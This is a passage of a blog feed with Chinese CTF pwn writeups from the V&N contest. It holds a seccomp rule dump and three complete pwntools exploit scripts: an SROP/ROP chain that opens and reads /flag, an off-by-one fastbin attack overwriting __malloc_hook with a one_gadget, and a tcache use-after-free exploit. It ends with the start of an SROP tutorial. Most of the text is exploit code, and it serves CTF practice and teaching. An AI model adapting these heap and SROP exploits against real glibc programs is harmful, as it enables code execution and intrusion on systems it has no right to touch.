<span class="number">0015</span></span><br><span class="line"> <span class="number">0009</span>: <span class="number">0x15</span> <span class="number">0x05</span> <span class="number">0x00</span> <span class="number">0x00000031</span>  <span class="keyword">if</span> (A == bind) goto <span class="number">0015</span></span><br><span class="line"> <span class="number">0010</span>: <span class="number">0x15</span> <span class="number">0x04</span> <span class="number">0x00</span> <span class="number">0x00000032</span>  <span class="keyword">if</span> (A == listen) goto <span class="number">0015</span></span><br><span class="line"> <span class="number">0011</span>: <span class="number">0x15</span> <span class="number">0x03</span> <span class="number">0x00</span> <span class="number">0x00000038</span>  <span class="keyword">if</span> (A == clone) goto <span class="number">0015</span></span><br><span class="line"> <span class="number">0012</span>: <span class="number">0x15</span> <span class="number">0x02</span> <span class="number">0x00</span> <span class="number">0x00000039</span>  <span class="keyword">if</span> (A == fork) goto <span class="number">0015</span></span><br><span class="line"> <span class="number">0013</span>: <span class="number">0x15</span> <span class="number">0x01</span> <span class="number">0x00</span> <span class="number">0x0000003b</span>  <span class="keyword">if</span> (A == execve) goto <span class="number">0015</span></span><br><span class="line"> <span class="number">0014</span>: <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x7fff0000</span>  <span class="keyword">return</span> ALLOW</span><br><span class="line"> <span class="number">0015</span>: <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  <span class="keyword">return</span> KILL</span><br></pre></td></tr></table></figure></p><h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line">context.arch=<span class="string">'amd64'</span></span><br><span class="line"><span class="comment"># context.arch='i386'</span></span><br><span class="line"></span><br><span class="line">vn_pwn_babypwn_1=ELF(<span class="string">'./vn_pwn_babypwn_1'</span>, checksec = <span class="keyword">False</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> context.arch == <span class="string">'amd64'</span>:</span><br><span class="line">    libc=ELF(<span class="string">"/lib/x86_64-linux-gnu/libc.so.6"</span>, checksec = <span class="keyword">False</span>)</span><br><span class="line"><span class="keyword">elif</span> context.arch == <span class="string">'i386'</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        libc=ELF(<span class="string">"/lib/i386-linux-gnu/libc.so.6"</span>, checksec = <span class="keyword">False</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        libc=ELF(<span class="string">"/lib32/libc.so.6"</span>, checksec = <span class="keyword">False</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_sh</span><span class="params">(other_libc = null)</span>:</span></span><br><span class="line">    <span class="keyword">global</span> libc</span><br><span class="line">    <span class="keyword">if</span> args[<span class="string">'REMOTE'</span>]:</span><br><span class="line">        <span class="keyword">if</span> other_libc <span class="keyword">is</span> <span class="keyword">not</span> null:</span><br><span class="line">            libc = ELF(<span class="string">"./"</span>, checksec = <span class="keyword">False</span>)</span><br><span class="line">        <span class="keyword">return</span> remote(sys.argv[<span class="number">1</span>], sys.argv[<span class="number">2</span>])</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> process(<span class="string">"./vn_pwn_babypwn_1"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_address</span><span class="params">(sh,info=null,start_string=null,end_string=null,offset=null,int_mode=False)</span>:</span></span><br><span class="line">    sh.recvuntil(start_string)</span><br><span class="line">    <span class="keyword">if</span> int_mode :</span><br><span class="line">        return_address=int(sh.recvuntil(end_string).strip(end_string),<span class="number">16</span>)</span><br><span class="line">    <span class="keyword">elif</span> context.arch == <span class="string">'amd64'</span>:</span><br><span class="line">        return_address=u64(sh.recvuntil(end_string).strip(end_string).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        return_address=u32(sh.recvuntil(end_string).strip(end_string).ljust(<span class="number">4</span>,<span class="string">'\x00'</span>))</span><br><span class="line">    log.success(info+str(hex(return_address+offset)))</span><br><span class="line">    <span class="keyword">return</span> return_address+offset</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_flag</span><span class="params">(sh)</span>:</span></span><br><span class="line">    sh.sendline(<span class="string">'cat /flag'</span>)</span><br><span class="line">    <span class="keyword">return</span> sh.recvrepeat(<span class="number">0.3</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_gdb</span><span class="params">(sh,stop=False)</span>:</span></span><br><span class="line">    gdb.attach(sh)</span><br><span class="line">    <span class="keyword">if</span> stop :</span><br><span class="line">        raw_input()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    sh = get_sh()</span><br><span class="line">    get_gdb(sh)</span><br><span class="line">    libc.address = get_address(sh,<span class="string">'The libc base address is '</span>,<span class="string">'Here is my gift: 0x'</span>,<span class="string">'\n'</span>,-libc.symbols[<span class="string">'puts'</span>],<span class="keyword">True</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">'Please input magic message: '</span>)</span><br><span class="line">    fake_frame  = p64(<span class="number">0</span>) * <span class="number">12</span></span><br><span class="line">    fake_frame += p64(<span class="number">0</span>)                                       <span class="comment"># RDI = RAX</span></span><br><span class="line">    fake_frame += p64(<span class="number">0</span>)                                       <span class="comment"># RSI = RDI</span></span><br><span class="line">    fake_frame += p64(<span class="number">0</span>)                                       <span class="comment"># RBP</span></span><br><span class="line">    fake_frame += p64(<span class="number">0</span>)                                       <span class="comment"># RBX</span></span><br><span class="line">    fake_frame += p64(libc.address + <span class="number">0x3C6500</span> - <span class="number">0x10</span>)          <span class="comment"># RDX = RSI</span></span><br><span class="line">    fake_frame += p64(<span class="number">0</span>)                                       <span class="comment"># RAX</span></span><br><span class="line">    fake_frame += p64(<span class="number">0x100</span>)                                   <span class="comment"># RCX = RDX</span></span><br><span class="line">    fake_frame += p64(libc.address + <span class="number">0x3C6500</span>)                 <span class="comment"># RSP</span></span><br><span class="line">    fake_frame += p64(libc.symbols[<span class="string">'syscall'</span>])                 <span class="comment"># RIP</span></span><br><span class="line">    fake_frame += p64(<span class="number">0</span>)                                       <span class="comment"># eflags</span></span><br><span class="line">    fake_frame += p64(<span class="number">0x33</span>)                                    <span class="comment"># cs : gs : fs</span></span><br><span class="line">    fake_frame += p64(<span class="number">0</span>) * <span class="number">7</span></span><br><span class="line">    <span class="comment"># get_gdb(sh)</span></span><br><span class="line">    sh.send(fake_frame)</span><br><span class="line">    ROP_chain  = <span class="string">'/flag\x00\x00\x00'</span></span><br><span class="line">    ROP_chain += p64(<span class="number">0</span>)</span><br><span class="line">    ROP_chain += p64(libc.address + <span class="number">0x0000000000021102</span>)</span><br><span class="line">    ROP_chain += p64(libc.address + <span class="number">0x3C6500</span> - <span class="number">0x10</span>)</span><br><span class="line">    ROP_chain += p64(libc.address + <span class="number">0x00000000000202e8</span>)</span><br><span class="line">    ROP_chain += p64(<span class="number">0</span>)</span><br><span class="line">    ROP_chain += p64(libc.symbols[<span class="string">'open'</span>])</span><br><span class="line">    ROP_chain += p64(libc.address + <span class="number">0x0000000000021102</span>)</span><br><span class="line">    ROP_chain += p64(<span class="number">3</span>)</span><br><span class="line">    ROP_chain += p64(libc.address + <span class="number">0x00000000000202e8</span>)</span><br><span class="line">    ROP_chain += p64(libc.address + <span class="number">0x3C6700</span>)</span><br><span class="line">    ROP_chain += p64(libc.address + <span class="number">0x0000000000001b92</span>)</span><br><span class="line">    ROP_chain += p64(<span class="number">0x100</span>)</span><br><span class="line">    ROP_chain += p64(libc.symbols[<span class="string">'read'</span>])</span><br><span class="line">    ROP_chain += p64(libc.address + <span class="number">0x0000000000021102</span>)</span><br><span class="line">    ROP_chain += p64(<span class="number">1</span>)</span><br><span class="line">    ROP_chain += p64(libc.address + <span class="number">0x00000000000202e8</span>)</span><br><span class="line">    ROP_chain += p64(libc.address + <span class="number">0x3C6700</span>)</span><br><span class="line">    ROP_chain += p64(libc.address + <span class="number">0x0000000000001b92</span>)</span><br><span class="line">    ROP_chain += p64(<span class="number">0x100</span>)</span><br><span class="line">    ROP_chain += p64(libc.symbols[<span class="string">'write'</span>])</span><br><span class="line">    <span class="comment">#raw_input('&gt;')</span></span><br><span class="line">    sh.send(ROP_chain)</span><br><span class="line">    <span class="keyword">print</span> sh.recv()</span><br></pre></td></tr></table></figure><h2 id="simpleHeap"><a href="#simpleHeap" class="headerlink" title="simpleHeap"></a>simpleHeap</h2><p>off-by-one漏洞，利用堆块重叠修改下一个堆块的size，造成overlap，可leak出libc_addr,再利用overlap进行fastbin attack，修改malloc_hook为one_gadget。但是此处所有的one_gadget条件均不满足，因此需要利用realloc函数调整栈帧。</p><h3 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="comment">#context.log_level = 'debug'</span></span><br><span class="line"><span class="keyword">if</span> sys.argv[<span class="number">1</span>]==<span class="string">"l"</span>:</span><br><span class="line">p=process(<span class="string">'./vn_pwn_simpleHeap'</span>)</span><br><span class="line">libc=ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p=remote(<span class="string">'vn.node3.buuoj.cn'</span>,<span class="number">52145</span>)</span><br><span class="line">libc=ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line"></span><br><span class="line">e=ELF(<span class="string">'./vn_pwn_simpleHeap'</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(index)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">'choice: '</span>)</span><br><span class="line">p.sendline(<span class="string">'3'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'?'</span>)</span><br><span class="line">p.sendline(str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(lenght,cont)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">'choice: '</span>)</span><br><span class="line">p.sendline(<span class="string">'1'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'?'</span>)</span><br><span class="line">p.sendline(str(lenght))</span><br><span class="line">p.recvuntil(<span class="string">':'</span>)</span><br><span class="line">p.send(cont)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(index,cont)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">'choice: '</span>)</span><br><span class="line">p.sendline(<span class="string">'2'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'?'</span>)</span><br><span class="line">p.sendline(str(index))</span><br><span class="line">p.recvuntil(<span class="string">':'</span>)</span><br><span class="line">p.send(cont)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(num)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">'choice: '</span>)</span><br><span class="line">p.sendline(<span class="string">'4'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'?'</span>)</span><br><span class="line">p.sendline(str(num))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x18</span>,<span class="string">'\x00'</span>) <span class="comment"># 0</span></span><br><span class="line">add(<span class="number">0x58</span>,<span class="string">'\x00'</span>) <span class="comment"># 1</span></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">'\x00'</span>) <span class="comment"># 2</span></span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">'\x00'</span>) <span class="comment"># 3</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># chunk overlap</span></span><br><span class="line">edit(<span class="number">0</span>,<span class="string">'\x00'</span>*<span class="number">0x18</span>+<span class="string">'\xd1'</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">'A'</span>) <span class="comment"># 1</span></span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">libc_base = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>)) <span class="number">-0x3c4c41</span></span><br><span class="line"><span class="keyword">print</span> hex(libc_base)</span><br><span class="line"></span><br><span class="line">malloc_hook = libc_base + libc.sym[<span class="string">'__malloc_hook'</span>]</span><br><span class="line">one_gadget = libc_base + <span class="number">0x4526a</span>  </span><br><span class="line">realloc = libc_base + libc.sym[<span class="string">'__libc_realloc'</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># free fastbin</span></span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x50</span>,p64(<span class="number">0</span>)*<span class="number">7</span>+p64(<span class="number">0x71</span>)+p64(malloc_hook<span class="number">-0x23</span>))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">'\x00'</span>)</span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">'\x00'</span>*<span class="number">11</span>+p64(one_gadget)+p64(realloc+<span class="number">14</span>))</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">'choice: '</span>,<span class="string">'1'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'size?'</span>,str(<span class="number">10</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="easy-heap"><a href="#easy-heap" class="headerlink" title="easy_heap"></a>easy_heap</h2><p>ubuntu18.04的uaf漏洞，有tcache机制，限制了free的次数为3，申请一个0x88的堆块释放两次，可以先利用Tcache dup泄露Heap address，然后再申请劫持Tcache structure，向任意地址读写，向malloc_hook写one_gadget完成利用，但是此处所有的one_gadget条件均不满足，因此需要利用realloc函数调整栈帧才能利用</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level='debug'</span></span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>, <span class="string">'splitw'</span>, <span class="string">'-h'</span>]</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dbg</span><span class="params">(address=<span class="number">0</span>)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> address==<span class="number">0</span>:</span><br><span class="line">        gdb.attach(p)</span><br><span class="line">        pause()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">if</span> address &gt; <span class="number">0xfffff</span>:</span><br><span class="line">            script=<span class="string">"b *&#123;:#x&#125;\nc\n"</span>.format(address)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            script=<span class="string">"b *$rebase(&#123;:#x&#125;)\nc\n"</span>.format(address)</span><br><span class="line">        gdb.attach(p, script)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size)</span>:</span></span><br><span class="line">p.sendlineafter(<span class="string">'choice: '</span>,<span class="string">'1'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'size?'</span>,str(size))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx,content)</span>:</span></span><br><span class="line">p.sendlineafter(<span class="string">'choice: '</span>,<span class="string">'2'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'idx?'</span>,str(idx))</span><br><span class="line">p.sendafter(<span class="string">'content:'</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(idx)</span>:</span></span><br><span class="line">p.sendlineafter(<span class="string">'choice: '</span>,<span class="string">'3'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'idx?'</span>,str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(idx)</span>:</span></span><br><span class="line">p.sendlineafter(<span class="string">'choice: '</span>,<span class="string">'4'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'idx?'</span>,str(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>,checksec=<span class="keyword">False</span>)</span><br><span class="line">p = process(<span class="string">'vn_pwn_easyTHeap'</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x88</span>) <span class="comment"># 0</span></span><br><span class="line">add(<span class="number">0x88</span>) <span class="comment"># 1</span></span><br><span class="line"> </span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">heap_addr=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">success(<span class="string">'&#123;&#125; =&gt; &#123;:#x&#125;'</span>.format(<span class="string">'heap_addr'</span>,heap_addr))</span><br><span class="line">add(<span class="number">0x88</span>) <span class="comment">#2</span></span><br><span class="line">edit(<span class="number">2</span>,p64(heap_addr<span class="number">-0x250</span>))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x88</span>) <span class="comment"># 3</span></span><br><span class="line">add(<span class="number">0x88</span>) <span class="comment"># 4</span></span><br><span class="line">edit(<span class="number">4</span>,<span class="string">'\x07'</span>*<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">libc_base = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))<span class="number">-0x3ebca0</span></span><br><span class="line">success(<span class="string">'&#123;&#125; =&gt; &#123;:#x&#125;'</span>.format(<span class="string">'libc_base'</span>,libc_base))</span><br><span class="line"></span><br><span class="line">malloc_hook = libc_base + libc.sym[<span class="string">'__malloc_hook'</span>]</span><br><span class="line">system = libc_base + libc.sym[<span class="string">'system'</span>]</span><br><span class="line">one_gadget = libc_base + <span class="number">0x4f322</span></span><br><span class="line"></span><br><span class="line">realloc = libc_base + libc.sym[<span class="string">'__libc_realloc'</span>]</span><br><span class="line"></span><br><span class="line">edit(<span class="number">4</span>,<span class="string">'\x07'</span>*<span class="number">8</span>+p64(<span class="number">0</span>)*<span class="number">12</span>+p64(malloc_hook<span class="number">-0x8</span>))</span><br><span class="line"><span class="comment">#dbg()</span></span><br><span class="line">add(<span class="number">0x68</span>) <span class="comment"># 5</span></span><br><span class="line">edit(<span class="number">5</span>,p64(one_gadget)+p64(realloc+<span class="number">8</span>))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x66</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 0x4f2c5 execve("/bin/sh", rsp+0x40, environ)</span></span><br><span class="line"><span class="comment"># constraints:</span></span><br><span class="line"><span class="comment">#   rcx == NULL</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 0x4f322 execve("/bin/sh", rsp+0x40, environ)</span></span><br><span class="line"><span class="comment"># constraints:</span></span><br><span class="line"><span class="comment">#   [rsp+0x40] == NULL</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 0x10a38c execve("/bin/sh", rsp+0x70, environ)</span></span><br><span class="line"><span class="comment"># constraints:</span></span><br><span class="line"><span class="comment">#   [rsp+0x70] == NULL</span></span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;V-amp-N招新赛writeup&quot;&gt;&lt;a href=&quot;#V-amp-N招新赛writeup&quot; class=&quot;headerlink&quot; title=&quot;V&amp;amp;N招新赛writeup&quot;&gt;&lt;/a&gt;V&amp;amp;N招新赛writeup&lt;/h1&gt;&lt;p&gt;参考链接:&lt;a hr
      
    
    </summary>
    
      <category term="pwn" scheme="https://nocbtm.github.io/categories/pwn/"/>
    
    
      <category term="pwn" scheme="https://nocbtm.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>SROP</title>
    <link href="https://nocbtm.github.io/2020/02/28/SROP/"/>
    <id>https://nocbtm.github.io/2020/02/28/SROP/</id>
    <published>2020-02-28T09:27:56.000Z</published>
    <updated>2020-04-11T13:41:49.269Z</updated>
    
    <content type="html"><![CDATA[<h2 id="什么是SROP"><a href="#什么是SROP" class="headerlink" title="什么是SROP"></a>什么是SROP</h2><p><code>SROP</code> 全称<code>Sigreturn Oriented Programming</code>，<code>sigreturn</code>是一个系统调用，在类 unix 系统发生 signal 的时候会被间接地调用。</p><p>signal 机制是类 unix 系统中进程之间相互传递信息的一种方法。一般，我们也称其为软中断信号，或者软中断。一般来说，信号机制常见的步骤如下图所示：</p><p><img alt="" data-src="https://nocbtm.github.io/imgs/srop-1.png" class="lozad"></p><p>包含的流程包括：</p><ol><li>内核向某个进程发送 signal 机制，该进程会被暂时挂起，进入内核态。</li><li>内核会为该进程保存相应的上下文，将当前的信息压入栈中（栈寄存器等），以及将 sigreturn系统调用地址压入栈中。需要注意的是，这一部分是在用户进程的地址空间的。之后会跳转到注册过的 signal handler 中处理相应的 signal。因此，当 signal handler 执行完之后，就会执行 sigreturn 代码。</li><li>执行 sigreturn 系统调用，恢复之前保存的上下文，其中包括将所有压入的寄存器，重新 pop 回对应的寄存器，最后恢复进程的执行。其中，32 位的 sigreturn 的调用号为 119，64 位的系统调用号为 15。</li></ol><p>保存在栈中的进程上下文信息为<code>ucontext_t</code>结构体，称其为<code>Signal Frame</code>，其结构体定义如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// defined in /usr/include/sys/ucontext.h</span></span><br><span class="line"><span class="comment">/* Userlevel context.  */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">ucontext_t</span></span></span><br><span class="line"><span class="class">  &#123;</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">int</span> uc_flags;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ucontext_t</span> *<span class="title">uc_link</span>;</span></span><br><span class="line">    <span class="keyword">stack_t</span> uc_stack;           <span class="comment">// the stack used by this context</span></span><br><span class="line">    <span class="keyword">mcontext_t</span> uc_mcontext;     <span class="comment">// the saved context</span></span><br><span class="line">    <span class="keyword">sigset_t</span> uc_sigmask;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">libc_fpstate</span> __<span class="title">fpregs_mem</span>;</span></span><br><span class="line">  &#125; <span class="keyword">ucontext_t</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// defined in /usr/include/bits/types/stack_t.h</span></span><br><span class="line"><span class="comment">/* 